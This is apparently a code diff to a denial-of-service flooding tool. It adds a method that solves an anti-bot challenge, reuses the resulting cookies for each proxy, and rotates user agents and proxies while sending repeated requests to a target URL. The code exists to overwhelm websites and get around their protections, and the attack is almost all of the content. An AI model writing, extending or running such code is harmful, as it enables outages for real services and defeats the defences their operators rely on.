@@ -4,6 +4,7 @@ import math
 import random
 import struct
 import time
+import uuid
 from copy import copy
 from dataclasses import dataclass
 from functools import partial
@@ -16,6 +17,7 @@ from urllib import parse
 
 import aiohttp
 import async_timeout
+from aiohttp_socks import ProxyConnector
 from OpenSSL import SSL
 from yarl import URL
 
@@ -24,13 +26,11 @@ from .core import Methods
 from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO
 from .proxies import NoProxySet, ProxySet
 from .targets import Target
+from .utils import GOSSolver
 from .vendor.referers import REFERERS
 from .vendor.rotate import params as rotate_params, suffix as rotate_suffix
 from .vendor.useragents import USERAGENTS
 
-
-USERAGENTS = list(USERAGENTS)
-REFERERS = list(set(a.strip() for a in REFERERS))
 
 ctx: SSLContext = create_default_context()
 ctx.check_hostname = False
@@ -430,6 +430,77 @@ class AsyncTcpFlood(FloodBase):
                     # XXX: we need to track in/out traffic separately
                     async with async_timeout.timeout(self._settings.http_response_timeout_seconds):
                         await response.read()
+        return packets_sent > 0
+
+    async def GOSPASS(self, on_connect=None) -> bool:
+        solver = GOSSolver()
+        packets_sent = 0
+        user_agent = random.choice(USERAGENTS)
+        proxy_url = self._proxies.pick_random()
+        if proxy_url is None:
+            connector, proxy_ip = None, solver.OWN_IP_KEY
+        else:
+            connector = ProxyConnector.from_url(proxy_url, ssl=False)
+            # we always replace proxy host with resolved addr
+            proxy_ip = URL(proxy_url).host
+        req_timeout = self._settings.http_response_timeout_seconds
+        cl_timeout = aiohttp.ClientTimeout(
+            connect=self._settings.connect_timeout_seconds, total=30)
+        conn_id = hash(uuid.uuid4())
+        headers = {
+            "User-Agent": user_agent,
+            "Accept-Encoding": "gzip, deflate",
+            'Cache-Control': 'max-age=0',
+            'Connection': 'Keep-Alive',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Pragma': 'no-cache',
+            'Accept-Language': 'ru-RU, ru;q=0.9',
+        }
+        async with aiohttp.ClientSession(
+            connector=connector,
+            timeout=cl_timeout,
+        ) as s:
+            try:
+                cached_cookies = solver.lookup(solver.DEFAULT_A, proxy_ip)
+                if cached_cookies is None:
+                    # there's certainly a race condition here between us looking up
+                    # in the dictionary and tasks are already running to fetch challenge
+                    # we are okay though as the challenge itself is stateless with
+                    # respect to only a few parameters we control for
+                    async with s.get(
+                        solver.path,
+                        headers=headers,
+                    ) as response:
+                        payload = dict(await response.json())
+                        if "cn" not in payload:
+                            raise RuntimeError("Invalid challenge payload")
+                    (latest_ts, cookies) = solver.solve(user_agent, payload, cache_key=proxy_ip)
+                    self._connections.add(conn_id)
+                else:
+                    (latest_ts, user_agent, cookies) = cached_cookies
+                    headers["User-Agent"] = user_agent
+                s.cookie_jar.update_cookies(cookies)
+                for ind in range(solver.MAX_RPC):
+                    if time.time() > latest_ts:
+                        break
+                    async with s.get(
+                        self._url.human_repr(),
+                        headers=headers,
+                    ) as response:
+                        self._connections.add(conn_id)
+                        if on_connect and not on_connect.done():
+                            on_connect.set_result(True)
+                        packets_sent += 1
+                        async with async_timeout.timeout(req_timeout):
+                            body = await response.read()
+                            if not solver.bypass(body):
+                                break
+                    await asyncio.sleep(1.0)
+            finally:
+                self._connections.discard(conn_id)
         return packets_sent > 0
 
     async def CFB(self, on_connect=None) -> bool:
